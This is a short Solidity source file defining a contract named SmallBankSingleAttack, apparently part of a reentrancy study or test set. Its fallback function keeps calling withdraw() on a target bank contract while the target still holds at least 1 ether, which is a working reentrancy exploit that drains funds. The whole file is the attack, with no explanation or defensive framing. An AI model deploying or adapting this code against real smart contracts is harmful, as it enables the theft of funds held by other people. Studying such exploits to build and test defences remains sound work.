// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;


interface SmallBankSingle {
    function withdraw() external;
}

contract SmallBankSingleAttack {
    address smallBankAddress;

    constructor(address _smallBankAddress) payable{
        smallBankAddress = _smallBankAddress;
    }

    fallback() external payable {
        if (smallBankAddress.balance >= 1 ether) {
            SmallBankSingle(smallBankAddress).withdraw();
        }
    }
}